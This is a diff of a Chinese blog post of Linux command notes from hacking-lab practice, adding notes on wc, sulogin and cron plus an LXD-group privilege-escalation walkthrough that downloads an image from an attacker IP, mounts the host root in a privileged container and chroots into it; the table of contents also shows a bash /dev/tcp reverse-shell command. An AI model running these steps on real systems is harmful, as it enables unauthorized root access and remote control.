@@ -28,7 +28,7 @@
 <meta property="og:description" content="靶场或者平时遇到的linux指令记录">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-30T03:32:44.000Z">
-<meta property="article:modified_time" content="2025-02-10T03:06:50.245Z">
+<meta property="article:modified_time" content="2025-02-11T13:08:58.228Z">
 <meta property="article:author" content="guayu-kakeru">
 <meta property="article:tag" content="linux">
 <meta property="article:tag" content="操作系统">
@@ -128,17 +128,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">9</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">11</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">35</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">37</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -226,7 +226,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-10 11:06:50" itemprop="dateModified" datetime="2025-02-10T11:06:50+08:00">2025-02-10</time>
+                <time title="修改时间：2025-02-11 21:08:58" itemprop="dateModified" datetime="2025-02-11T21:08:58+08:00">2025-02-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -974,6 +974,127 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/dev/</span>pts/N</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>名称查看配置文件：<code>docker inspect </code><br>列出所有容器: <code>docker ps -a</code><br>进入容器的交互式shell : <code>docker exec -it &lt;container_id_or_name&gt; /bin/bash</code><br>查看所有卷: <code>docker volume ls</code><br>删除卷：<code>docker volume rm &lt;volume_name&gt;</code></p>
+<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p><code>wc</code>（<strong>word count</strong>）是一个用于统计文件内容的命令，能够计算 <strong>行数、单词数、字符数和字节数</strong>。</p>
+<h3 id="常用参数-7"><a href="#常用参数-7" class="headerlink" title="常用参数"></a><strong>常用参数</strong></h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td><strong>只统计行数</strong>（Lines）</td>
+</tr>
+<tr>
+<td><code>-w</code></td>
+<td><strong>只统计单词数</strong>（Words）</td>
+</tr>
+<tr>
+<td><code>-c</code></td>
+<td><strong>只统计字节数</strong>（Bytes）</td>
+</tr>
+<tr>
+<td><code>-m</code></td>
+<td><strong>只统计字符数</strong>（Characters），与 <code>-c</code> 类似，但 <code>-m</code> 适用于多字节字符（如 UTF-8）</td>
+</tr>
+<tr>
+<td><code>-L</code></td>
+<td><strong>输出最长行的字符数</strong></td>
+</tr>
+</tbody></table>
+<h2 id="sulogin"><a href="#sulogin" class="headerlink" title="sulogin"></a>sulogin</h2><p><code>sulogin</code> 是 <strong>Single User Login（单用户模式登录）</strong> 的命令，通常用于 <strong>Linux&#x2F;Unix 在单用户模式（维护模式）下，以 root 身份登录</strong>，用于修复系统或执行维护任务。<br>基本用法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sulogin <span class="selector-attr">[OPTIONS]</span> <span class="selector-attr">[TTY]</span></span><br></pre></td></tr></table></figure></div>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-p</td>
+<td>单用户 Shell 调用一个破折号作为参数中的第一个字符</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>程序只会等待用户输入指定秒数</td>
+</tr>
+<tr>
+<td>ENVIRONMENT VARIABLES</td>
+<td></td>
+</tr>
+<tr>
+<td>sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start. If the environment variable is not set, it will try to execute root’s shell from &#x2F;etc&#x2F;passwd. If that fails, it will fall</td>
+<td></td>
+</tr>
+<tr>
+<td>back to &#x2F;bin&#x2F;sh.</td>
+<td></td>
+</tr>
+<tr>
+<td>说明SUSHELL这个环境变量可以指定启动什么shell</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="cron定时任务"><a href="#cron定时任务" class="headerlink" title="cron定时任务"></a>cron定时任务</h2><p><code>cron</code> 是 <strong>Linux&#x2F;Unix</strong> 系统中的定时任务调度工具，可用于 <strong>定期执行脚本、命令或程序</strong>，适用于 <strong>自动备份、日志清理、定时任务等场景</strong>。<br>相关路径</p>
+<table>
+<thead>
+<tr>
+<th><strong>文件 &#x2F; 目录</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/etc/crontab</code></td>
+<td><strong>系统级</strong> crontab 配置，所有用户共享</td>
+</tr>
+<tr>
+<td><code>/var/spool/cron/crontabs/</code></td>
+<td><strong>存放用户的 crontab</strong> 任务文件（不能手动编辑）</td>
+</tr>
+<tr>
+<td><code>/etc/cron.d/</code></td>
+<td><strong>存放系统定时任务</strong>，格式与 <code>/etc/crontab</code> 相同</td>
+</tr>
+<tr>
+<td><code>/etc/cron.hourly/</code></td>
+<td><strong>每小时</strong> 执行的脚本目录</td>
+</tr>
+<tr>
+<td><code>/etc/cron.daily/</code></td>
+<td><strong>每天</strong> 执行的脚本目录</td>
+</tr>
+<tr>
+<td><code>/etc/cron.weekly/</code></td>
+<td><strong>每周</strong> 执行的脚本目录</td>
+</tr>
+<tr>
+<td><code>/etc/cron.monthly/</code></td>
+<td><strong>每月</strong> 执行的脚本目录</td>
+</tr>
+<tr>
+<td><code>/var/log/syslog</code> 或 <code>/var/log/cron</code></td>
+<td><strong>存放 <code>cron</code> 执行日志</strong>（不同系统路径可能不同）</td>
+</tr>
+</tbody></table>
+<h2 id="lxd"><a href="#lxd" class="headerlink" title="lxd"></a>lxd</h2><p>LXD 是一个 root 进程，它负责执行任意用户的 LXD UNIX 套接字写入访问操作。而且在某些情况下，LXD 甚至都不会调用它的用户权限进行检查和匹配</p>
+<p>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于 Chroot 和完整开发的虚拟机之间，LXC 可以创建一个跟正常 Linux 操作系统十分接近的环境，但是不需要使用到单独的内核资源。</p>
+<p>Linux Daemon（LXD）是一个轻量级容器管理程序，而 LXD 是基于 LXC 容器技术实现的，而这种技术之前 Docker 也使用过。LXD 使用了稳定的 LXC API 来完成所有的后台容器管理工作，并且增加了 REST API 支持，更进一步地提升了用户体验度。<br>如果一个普通用户属于 <code>lxd</code> 组，那么他就可以：</p>
+<ul>
+<li>创建 LXD 容器</li>
+<li>以 <code>security.privileged=true</code> 的方式运行容器（即让容器以 root 权限运行）</li>
+<li>挂载宿主机的目录到容器中，理论上可以访问整个文件系统</li>
+</ul>
+<p>由于 <code>lxd</code> 进程是以 root 权限运行的，而 <code>lxd</code> 组用户可以控制 <code>lxd</code>，所以它本质上是一个 <strong>“权限升级的入口”</strong>。<br><strong>（2）提权流程</strong></p>
+<p><strong>核心思想</strong>：</p>
+<ol>
+<li><strong>利用 LXD 组权限</strong> 创建一个 <strong>特权（privileged）容器</strong>，该容器将以 root 运行。</li>
+<li><strong>挂载宿主机的根目录</strong> 到容器的 <code>/mnt/root</code> 目录，使得容器内部可以直接访问宿主机的文件系统。</li>
+<li>进入容器后，利用 <code>chroot</code> 进入 <code>/mnt/root</code>，从而获得宿主机的 root 权限。<br>提权详细过程</li>
+</ol>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（1）获取 Alpine Linux 镜像</span></span><br><span class="line">wget http://攻击机IP/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#lxd初始化</span></span><br><span class="line">lxd init   <span class="comment">#一路回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后导入镜像：</span></span><br><span class="line">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> image_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建特权容器</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载宿主机的根目录</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动并进入容器</span></span><br><span class="line">lxc start ignite </span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到宿主机环境</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/root</span><br></pre></td></tr></table></figure></div>
 
     </div>
 
@@ -1059,7 +1180,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AC%94%E8%AE%B0"><span class="nav-text">Linux 常用指令笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#awk-%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-text">&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8F%98%E9%87%8F"><span class="nav-text">核心变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#knockd-%E6%9C%8D%E5%8A%A1"><span class="nav-text">knockd 服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A-etc-knockd-conf"><span class="nav-text">配置文件：&#x2F;etc&#x2F;knockd.conf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="nav-text">功能：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">应用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#grep-%E6%96%87%E6%9C%AC%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7"><span class="nav-text">grep 文本搜索工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8"><span class="nav-text">元字符表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-1"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc-Netcat-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7"><span class="nav-text">nc (Netcat) 网络工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-2"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">sudo 权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B8%E5%9E%8B%E9%85%8D%E7%BD%AE"><span class="nav-text">典型配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#drush-Drupal-Shell"><span class="nav-text">drush (Drupal Shell)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scp-%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-text">scp 安全文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-2"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ps"><span class="nav-text">ps</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-3"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apache2"><span class="nav-text">apache2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tac"><span class="nav-text">tac</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#var-mail"><span class="nav-text">&#x2F;var&#x2F;mail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-release"><span class="nav-text">&#x2F;etc&#x2F;release</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tar"><span class="nav-text">tar</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-4"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-3"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#find"><span class="nav-text">find</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%92%8C%E7%A4%BA%E4%BE%8B"><span class="nav-text">常用参数和示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93break-system-packages"><span class="nav-text">–break-system-packages</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exiftool"><span class="nav-text">exiftool</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-5"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl"><span class="nav-text">curl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tldr"><span class="nav-text">tldr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gocr"><span class="nav-text">gocr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#doas"><span class="nav-text">doas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-4"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dig"><span class="nav-text">dig</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-5"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#resolv-conf"><span class="nav-text">resolv.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-bind"><span class="nav-text">&#x2F;etc&#x2F;bind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tr"><span class="nav-text">tr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-6"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sed"><span class="nav-text">sed</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-7"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alias"><span class="nav-text">alias</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#openssl"><span class="nav-text">openssl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xargs"><span class="nav-text">xargs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#id-rsa"><span class="nav-text">id_rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb"><span class="nav-text">smb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Samba-%E7%AE%80%E4%BB%8B"><span class="nav-text">Samba 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="nav-text">主要功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">主要配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smbclient-%E5%8F%82%E6%95%B0%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-text">smbclient 参数和使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-text">ftp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E4%BA%A4%E4%BA%92%E5%91%BD%E4%BB%A4%EF%BC%88%E7%99%BB%E5%BD%95%E5%90%8E%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="nav-text">常用交互命令（登录后使用）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getcap"><span class="nav-text">getcap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%BD%E5%8A%9B%EF%BC%88Capabilities%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="nav-text">能力（Capabilities）示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ln"><span class="nav-text">ln</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-6"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i-dev-tcp-ip-1234-0-1"><span class="nav-text">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-i"><span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dev-tcp-192-168-240-83-1234"><span class="nav-text">&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1"><span class="nav-text">0&gt;&amp;1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stty-raw-echo-fg-%E7%BE%8E%E5%8C%96%E7%BB%88%E7%AB%AF"><span class="nav-text">stty raw -echo; fg (美化终端)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93"><span class="nav-text">–</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pts"><span class="nav-text">pts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker"><span class="nav-text">docker</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AC%94%E8%AE%B0"><span class="nav-text">Linux 常用指令笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#awk-%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-text">&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8F%98%E9%87%8F"><span class="nav-text">核心变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#knockd-%E6%9C%8D%E5%8A%A1"><span class="nav-text">knockd 服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A-etc-knockd-conf"><span class="nav-text">配置文件：&#x2F;etc&#x2F;knockd.conf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="nav-text">功能：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">应用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#grep-%E6%96%87%E6%9C%AC%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7"><span class="nav-text">grep 文本搜索工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8"><span class="nav-text">元字符表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-1"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc-Netcat-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7"><span class="nav-text">nc (Netcat) 网络工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-2"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">sudo 权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B8%E5%9E%8B%E9%85%8D%E7%BD%AE"><span class="nav-text">典型配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#drush-Drupal-Shell"><span class="nav-text">drush (Drupal Shell)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scp-%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-text">scp 安全文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-2"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ps"><span class="nav-text">ps</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-3"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apache2"><span class="nav-text">apache2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tac"><span class="nav-text">tac</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#var-mail"><span class="nav-text">&#x2F;var&#x2F;mail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-release"><span class="nav-text">&#x2F;etc&#x2F;release</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tar"><span class="nav-text">tar</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-4"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-3"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#find"><span class="nav-text">find</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%92%8C%E7%A4%BA%E4%BE%8B"><span class="nav-text">常用参数和示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93break-system-packages"><span class="nav-text">–break-system-packages</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exiftool"><span class="nav-text">exiftool</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-5"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl"><span class="nav-text">curl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tldr"><span class="nav-text">tldr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gocr"><span class="nav-text">gocr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#doas"><span class="nav-text">doas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-4"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dig"><span class="nav-text">dig</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-5"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#resolv-conf"><span class="nav-text">resolv.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-bind"><span class="nav-text">&#x2F;etc&#x2F;bind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tr"><span class="nav-text">tr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-6"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sed"><span class="nav-text">sed</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-7"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alias"><span class="nav-text">alias</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#openssl"><span class="nav-text">openssl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xargs"><span class="nav-text">xargs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#id-rsa"><span class="nav-text">id_rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb"><span class="nav-text">smb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Samba-%E7%AE%80%E4%BB%8B"><span class="nav-text">Samba 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="nav-text">主要功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">主要配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 